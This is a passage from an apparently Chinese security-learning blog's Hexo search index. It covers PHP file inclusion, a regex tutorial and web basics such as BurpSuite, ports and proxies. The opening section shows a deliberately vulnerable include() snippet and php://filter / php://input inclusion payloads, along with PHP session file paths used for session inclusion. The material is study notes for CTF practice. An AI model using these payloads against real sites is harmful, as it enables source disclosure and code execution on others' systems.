alt="在这里插入图片描述"></p></li><li><p>使用条件</p><ol><li>allow_url_include = Off/On #无要求</li></ol></li><li><p>范例</p><p>环境：</p><pre class="line-numbers language-none"><code class="language-none">//filter.php&lt;?phpinclude($_GET[file]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>应用：</p><pre class="line-numbers language-none"><code class="language-none">//payload[GAT DATA 1]:    filter.php?file=php://filter/read=convert.base64-encode/resource=filter.php  [GET DATA 2]:    filter.php?file=php://filter/convert.base64-encode/resource=filter.php  [GAT DATA 3]:    filter.php?file=php://filter/resource=php://input    [POST DATA]:    &lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3></li></ul><p>简介<br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，而且对于应用程序中的全部页面都是可用的。在您把用户信息存储到 PHP session 中以前，首先必须使用<code>session_start()</code>启动会话。<br>php的session文件的保存路径能够再phpinfo的session.save_path查询到<br><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/8fdaca63a2e445d09ef18358e0241e3b-2.png" alt="在这里插入图片描述"><br><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/d19caeab65644e959291bfbbe4cff812-2.png" alt="在这里插入图片描述"><br>常见的php-session存放位置：</p><pre class="line-numbers language-none"><code class="language-none">/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中能够看到。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><p>最近在复习，自己php的题目做的还比较少，只实践了部分php漏洞。</p><p>在整理漏洞的过程中发现一些漏洞对于我来说是非常陌生的，在整理的过程中也拓宽了自己的视野。</p><p>最近php8也发布了，一些漏洞说不定已经过时，又会出现新的漏洞。只有不断的学习才能适应这个快速发展的时代！</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式学习</title>
      <link href="2020/11/11/zheng-ze-biao-da-shi-xue-xi/"/>
      <url>2020/11/11/zheng-ze-biao-da-shi-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>概念：</p><p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p><p>简介：</p><p>正则表达式是对字符串（包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为“元字符”））操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。正则表达式是一种文本模式，该模式描述在搜索文本时要匹配的一个或多个字符串。                       ——摘自百度百科</p><p>那么它的功能是什么呢？</p><p>我的理解就是进行字符串的匹配验证，查找替换，分割截取之类的</p><p>它的组成：</p><ul><li><p>  1.普通字符：除了元字符之外的可打印和不可打印字符，一般都是简单的匹配自身，比如hello匹配‘hello</p></li><li><p>  2.元字符 ：除了普通字符进行的确切的匹配之外,还需要进行一些模糊匹配,所以需要一些特殊字符来表示如: .   [ ] (  ) * + ? ^ $ \ |  如需要对这些特殊字符进行匹配只需要进行转义即可</p></li></ul><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th align="center">字符</th><th>描述</th></tr></thead><tbody><tr><td align="center">\</td><td>转义字符</td></tr><tr><td align="center">^</td><td>匹配字符串开始的位置</td></tr><tr><td align="center">$</td><td>匹配字符串结尾的位置</td></tr><tr><td align="center">.</td><td>匹配除换行符（\n、\r）之外的任何单个字符，相等于【^\n\r】</td></tr><tr><td align="center">|</td><td>或</td></tr><tr><td align="center">[]</td><td>字符集合,可以和上面的字符配合起来使用</td></tr><tr><td align="center">()</td><td>分组</td></tr><tr><td align="center">*</td><td><strong>零次或多次</strong>匹配前面的字符或子表达式</td></tr><tr><td align="center">+</td><td><strong>一次或多次</strong>匹配前面的字符或子表达式</td></tr><tr><td align="center">?</td><td><strong>零次或一次</strong>匹配前面的字符或子表达式</td></tr><tr><td align="center">{n}</td><td>指定匹配的次数, 比如m{2}不能匹配“amy“,只能匹配“ammy”</td></tr><tr><td align="center">{n,}</td><td>至少匹配的次数, 比如m{2}不能匹配“amy“,但是能匹配“ammmmmmy”, 如m{1,}可以用m+来表示,m{0,}可以用m*来表示,都是一样的意思</td></tr><tr><td align="center">{n,m}</td><td>在上一个的基础上,限定了最多匹配多少次</td></tr><tr><td align="center">?</td><td>?出现在上面6个限定符之后,则阻止它们进行贪婪匹配, 比如对于aaaaaa, a+?只匹配第一个字符串, 而a+全都匹配</td></tr><tr><td align="center">\b (boundary)</td><td>匹配单词边界, 如er\b只能匹配never里面的er,但不能匹配verb中的er</td></tr><tr><td align="center">\B</td><td>匹配非单词边界, 和上面相反</td></tr><tr><td align="center">\cx</td><td>c表示键盘输入control,x表示键盘上的所有大小写字母,如\cC 表示ctrl+c</td></tr><tr><td align="center">\d      (digit)</td><td>匹配一个数字</td></tr><tr><td align="center">\f</td><td>换页符</td></tr><tr><td align="center">\n</td><td>换行符</td></tr><tr><td align="center">\s</td><td>匹配空字符</td></tr><tr><td align="center">\S</td><td>匹配非空字符</td></tr><tr><td align="center">\t</td><td>匹配水平制表符</td></tr><tr><td align="center">\v</td><td>匹配垂直制表符</td></tr><tr><td align="center">\w</td><td>匹配字母、数字、下划线。等价于[A-Za-z0-9_]</td></tr><tr><td align="center">\W</td><td>匹配非字母、数字、下划线。等价于 [^A-Za-z0-9_]</td></tr><tr><td align="center">\xn</td><td>匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。</td></tr><tr><td align="center">\num</td><td>匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。</td></tr><tr><td align="center">\n</td><td>标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</td></tr><tr><td align="center">\nml</td><td>如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</td></tr><tr><td align="center">\un</td><td>匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。</td></tr></tbody></table><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><table><thead><tr><th align="center">修饰符</th><th>含义</th><th>描述</th></tr></thead><tbody><tr><td align="center">i</td><td>ignore - 不区分大小写</td><td>将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td></tr><tr><td align="center">g</td><td>global - 全局匹配</td><td>查找所有的匹配项。</td></tr><tr><td align="center">m</td><td>multi line - 多行匹配</td><td>使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，是多行!，而不是整个字符串的开头和结尾。</td></tr><tr><td align="center">s</td><td>特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td><td>默认情况下的圆点 <strong>.</strong> 是 匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td></tr></tbody></table><h2 id="先行断言"><a href="#先行断言" class="headerlink" title="先行断言"></a>先行断言</h2><table><thead><tr><th align="left">字符</th><th>描述</th></tr></thead><tbody><tr><td align="left">a(?=b)</td><td>先行断言,a在b前面才会匹配</td></tr><tr><td align="left">a(?!b)</td><td>先行否定断言,a不在b前面才会匹配</td></tr></tbody></table><h2 id="后行断言"><a href="#后行断言" class="headerlink" title="后行断言"></a>后行断言</h2><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>(?&lt;=b)a</td><td>后行断言,a只有在b后面才匹配</td></tr><tr><td>(?&lt;!b)a</td><td>后行否定断言,a只有不在b后面才进行匹配</td></tr></tbody></table><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="来匹配个邮箱吧"><a href="#来匹配个邮箱吧" class="headerlink" title="来匹配个邮箱吧"></a>来匹配个邮箱吧</h3><pre class="line-numbers language-none"><code class="language-none">/^([\w-.]*)@([A-Za-z0-9]+).([A-Za-z]{2,10})$/gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210105114717769.png" alt="image-20210105114717769"></p><p>发现有形如edu.cn的匹配不了了…..把.放进去就可以了</p><pre class="line-numbers language-none"><code class="language-none">/^([\w-.]*)([@A-Za-z0-9]+\.)+([A-Za-z]{2,10})$/gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210105115536732.png" alt="image-20210105115536732"></p><p>应该都是能匹配上的,匹配的有些许的粗糙,目前只会写一点简单的</p><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><p>根据IP地址的特点,可以写出下面的正则来匹配</p><pre class="line-numbers language-none"><code class="language-none">/^(\d{1}|[1-9]{1}\d{1}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1}|[1-9]{1}\d{1}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1}|[1-9]{1}\d{1}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1}|[1-9]{1}\d{1}|1\d\d|2[0-4]\d|25[0-5])$/gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210105145332611.png" alt="image-20210105145332611"></p><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><pre class="line-numbers language-none"><code class="language-none">/^\[(\d+)\/(\w+)\/(\d+):(\d+):(\d+):(\d+)\s\+(\d+)\]$/gmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210105150707371.png" alt="image-20210105150707371"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于正则表达式自己只学会了一些皮毛，不去练会儿过了一段时间很容易就忘掉了。</p><p>在一些ctf的题目中会遇见一些老长老长的正则让你去匹配，发现每次一点一点去写太浪费时间了，想一下应该会有一些脚本可以根据正则表达式反向生成相匹配的字符串，一查发现各种语言都有相应的库可以调用用来生成匹配的字符串如python的<a href="https://github.com/crdoconnor/xeger">xeger</a>和<a href="https://github.com/asciimoo/exrex">exrex</a>等，java也有<a href="https://github.com/bluezio/xeger">xeger</a>工具包可以用</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础</title>
      <link href="2020/11/01/web-ji-chu/"/>
      <url>2020/11/01/web-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="BurpSuite的使用"><a href="#BurpSuite的使用" class="headerlink" title="BurpSuite的使用"></a>BurpSuite的使用</h2><h3 id="抓网页的包"><a href="#抓网页的包" class="headerlink" title="抓网页的包"></a>抓网页的包</h3><p>1.配置端口和IP</p><p>2.导入证书(抓https)</p><p>3.浏览器开启BP的代理</p><p><img src="https://gitee.com/anwar211/image/raw/master/img/image-20201114165712432.png" alt="image-20201114165712432"></p><p>抓到!</p><h3 id="抓APP和微信小程序的包"><a href="#抓APP和微信小程序的包" class="headerlink" title="抓APP和微信小程序的包"></a>抓APP和微信小程序的包</h3><p>抓APP的包和电脑差不多</p><p>发现现在新版的微信抓小程序的包会直接闪退</p><p>But,登上去的时候居然叫我更新?这不陷入死循环了吗😐</p><p>不过想一下,可以先登新版的微信然后给它卸了,留着它的登录数据,再下个老版的回来呀！</p><pre class="line-numbers language-none"><code class="language-none">adb shell pm unstall -k com.tencent.mmadb install -r -d  //+apk路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用adb把这个删了,然后通过adb安装旧版微信</p><p><img src="https://gitee.com/wxs211/image/raw/master/img/image-20201114194025659.png" alt="image-20201114194025659"></p><p>抓到欢乐斗地主小程序的包啦!</p><h2 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h2><h4 id="1-操作系统"><a href="#1-操作系统" class="headerlink" title="1.操作系统"></a>1.操作系统</h4><p>Windows,Linux,Mac那怎么判断一个网站运行在什么系统上呢?</p><p>一个小细节==windows大小写不敏感,而Linux大小写是敏感的==,所以可以通过修改url,看是否报错来判断系统,当然也可以通过抓包来看啦。</p><h4 id="2-搭建平台（服务器软件）"><a href="#2-搭建平台（服务器软件）" class="headerlink" title="2.搭建平台（服务器软件）"></a>2.搭建平台（服务器软件）</h4><p>有iis apache tomcat nginx等一些</p><h4 id="3-脚本语言"><a href="#3-脚本语言" class="headerlink" title="3.脚本语言"></a>3.脚本语言</h4><p>asp php jsp aspx等。。。。</p><p>那怎么看目标网站用的啥脚本语言呢？</p><p>首先一目了然的就是通过URL看啦，举个列子</p><p><img src="https://gitee.com/wxs211/image/raw/master/img/image-20201114173452266.png" alt="image-20201114173452266"></p><p><img src="https://gitee.com/wxs211/image/raw/master/img/image-20201114195928905.png" alt="image-20201114195928905"></p><p>当然也可以通过抓包，爬虫，搜索引擎，还有一些专门的工具来查看</p><h4 id="4-数据库"><a href="#4-数据库" class="headerlink" title="4.数据库"></a>4.数据库</h4><p>常见的有mysql，Oracle，阿里云的polardb等一些国内公司自己搞的。。。。</p><p>要使用数据库就必须要给它开放一个端口</p><p>常见的mysql开放的端口一般是3306，Oracle是1521，sqlserver是1433。。。。</p><p>那怎么查看目标网站使用的数据库呢?</p><p>1.可以通过端口扫描，看它开放了什么端口</p><p>2.如果已经知道了目标网站使用的脚本语言就可以推断出它使用的数据库</p><p>一般为了兼容,通常有如下组合</p><p><strong>asp+access</strong></p><p><strong>php+mysql</strong></p><p><strong>aspx+mssql</strong></p><p><strong>jsp+mssql或oracle</strong></p><p>PS:==linux不存在asp aspx ,不存在iis==;</p><h4 id="5-CMS-内容管理系统"><a href="#5-CMS-内容管理系统" class="headerlink" title="5.CMS(内容管理系统)"></a>5.CMS(内容管理系统)</h4><p>cms就是内容管理系统，也可以理解成为网站建设系统。对于一些seo专员来说，内容管理系统可以帮助我们快速的建设任何类型的网站。cms系统的特点就是把网站模版和网站程序完全分开，同时还会提供模版方案，从而让网站的模版设计和程序彻底的分开，让网站设计人员可以对每个页面、栏目都使用不同的模版，随时都能进行编辑和修改。</p><p>内容管理系统使用基于角色的用户管理，通过添加不同权限的用户，可以把网站管理权限分配到不同的用户上，然后把这些用户通过权限来划分各种级别，例如：超级管理人员、栏目管理人员、文档录入人员、审核人员等等，这样网站在发布内容的时候就不会出现任何错误，同时也能保证内容的质量。  </p><h4 id="6-中间件"><a href="#6-中间件" class="headerlink" title="6.中间件"></a>6.中间件</h4><p>个人理解是介于系统和程序直接的一种东西，有了中间件可以简化开发流程，一些功能就不用全都用代码写出来，而是通过调用这个中间件就能够完成某些功能。举个例子，你去寄快递只要填收件人的地址和电话就ok了，快递由谁运，运到了哪儿你并不需要担心，只要快递送到了就好了，这时候快递公司就充当一个中间件的角色</p><h4 id="7-容器"><a href="#7-容器" class="headerlink" title="7.容器"></a>7.容器</h4><p>应用于将操作系统进行隔离的一种技术，避免一个应用的崩溃和影响其他应用的运行</p><p>容器和虚拟机的区别在与容器更加轻量，而虚拟机还需要一个操作系统再在这个系统之上安装应用</p><p>虚拟机一般适用于对不同的用户进行隔离，而容器一般适用于对不同的应用进行隔离</p><p>容器拿来就可以直接使用，不需要考虑环境之类的问题</p><h4 id="8-框架"><a href="#8-框架" class="headerlink" title="8.框架"></a>8.框架</h4><p>拿java来说，Java有三大框架，spring，struts，hibernate</p><p>框架就是一些类和接口的集合，相当与开发中的一个半成品，封装好直接拿来用就可以了 ，省的一遍又一遍敲着重复的代码</p><h2 id="常见的端口服务："><a href="#常见的端口服务：" class="headerlink" title="常见的端口服务："></a>常见的端口服务：</h2><p><strong>端口：20</strong></p><p>​    服务：FTP（文件传输协议）</p><p>​    说明：FTP数据端口</p><p><strong>端口：21</strong></p><p>​    服务：FTP</p><p>​    说明：FTP服务器所开放的端口，用于上传、下载。</p><p>​    最常见故障：用于攻击者寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口</p><p><strong>端口：22</strong></p><p>​    服务：SSh（安全外壳协议）</p><p>​    说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p><p><strong>端口：23</strong></p><p>​    服务：Telnet（远程终端协议）</p><p>​    说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个端口。</p><p><strong>端口：25</strong></p><p>​    服务：SMTP（简单邮件传输协议）</p><p>​     说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM（垃圾邮件）。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。</p><p><strong>端口：53</strong></p><p>​    服务：DNS（域名系统）</p><p>​    说明：UDP端口，DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p><p><strong>端口：67</strong></p><p>​    服务：DHCP（动态主机配置协议）</p><p>​    说明：UDP端口，67端口发放IP</p><p><strong>端口 :  68</strong></p><p>​    服务：DHCP（动态主机配置协议）</p><p>​    说明：UDP端口，68端口发送成功和失败回应</p><p><strong>端口：69</strong></p><p>​    服务：TFTP（简单文件传输协议）</p><p>​    说明：是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的1文件传输服务</p><p><strong>端口：80</strong></p><p>​    服务：HTTP（超文本传输协议）</p><p>​    说明：明文传输。用于网页浏览，互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准 。木马Executor开放此端口。</p><p><strong>端口：110</strong></p><p>​    服务：pop3（邮局协议版本3）</p><p>​    说明：是TCP/IP协议族中的一员，主要用于支持使用客户端远程管理在服务器上的电子邮件。</p><p><strong>端口：123</strong></p><p>​    服务：NTP（网络时间协议）</p><p>​    说明：用来使网络中的各个计算机时间同步的一种协议。它的用途是把计算机的时钟同步到<strong>世界协调时</strong>UTC，其精度在局域网内可达0.1ms，在互联网上绝大多数的地方其精度可以达到1-50ms。它可以使计算机对其服务器或时钟源（如石英钟，GPS等等）进行时间同步，它可以提供高精准度的时间校正，而且可以使用加密确认的方式来防止病毒的协议攻击。</p><p><strong>端口：161</strong></p><p>​    服务：SNMP（简单网络管理协议）</p><p>​     说明：SNMP允许远程管理设备。所有配置和运行信息都储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><p><strong>端口：389</strong></p><p>​    服务：LDAP（轻量级目录访问协议）、ILS（定位服务）</p><p>​    说明：LDAP是一种可让任何人找到网络中的组织，个人档案或装置等其他资源的一种软件协议不论是公共因特网或企业内网络。LDAP   服务和ILS服务共用389端口。</p><p><strong>端口：443</strong></p><p>​    服务：Https（超文本传输安全协议）</p><p>​    说明：加密传输。网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。 是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层（安全套接层），HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。</p><p><strong>端口：636</strong></p><p>​    服务：LDAPS</p><p>​    说明：通过安全套接字层的轻型目录访问协议 。</p><p><strong>端口：873</strong></p><p>​    服务：rsync</p><p>​    说明：文件传输服务</p><p><strong>端口：1521</strong></p><p>​    服务：Oracle</p><p><strong>端口：3306</strong></p><p>​    服务：MySQL</p><p>​    说明：SQL连接端口，提供客户端连接服务端 。</p><p><strong>端口：9000</strong></p><p>​    服务：php-fpm</p><p>​    说明：PHP以daemon模式运行</p><h2 id="正向代理，反向代理，端口转发"><a href="#正向代理，反向代理，端口转发" class="headerlink" title="正向代理，反向代理，端口转发"></a>正向代理，反向代理，端口转发</h2><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>代理服务器代理客户端去和目标服务器交互，目标服务器并不知道真正发送请求的客户端是哪个</p><p>类似于你找中介买房，然后中介再去和房东交涉</p><p>通过正向代理可以实现访问连不上的网站😁，也可以设置代理服务器提高访问速度，最最最重要的是可以<strong>隐藏客户端的真实IP</strong></p><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>和正向代理相反，代理服务器接受internet上的请求，然后将其转发给内网服务器，然后将请求结果返回给Internet上请求连接的客户端</p><p>反向代理和正向代理相反，它可以<strong>隐藏服务器的真实IP</strong>，反向代理服务器也可以作为应用层的防火墙来保证网站的安全。</p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>端口转发就是将一个端口，这个端口可以本机的端口也可以是本机可以访问到的任意主机的端口，转发到任意一台可以访问到的IP上，通常这个IP是公网IP</p><p>适用端口转发的网络环境有以下几种：</p><ol><li><p>服务器处于内网，可以访问外部网络。</p></li><li><p>服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</p></li><li><p>服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
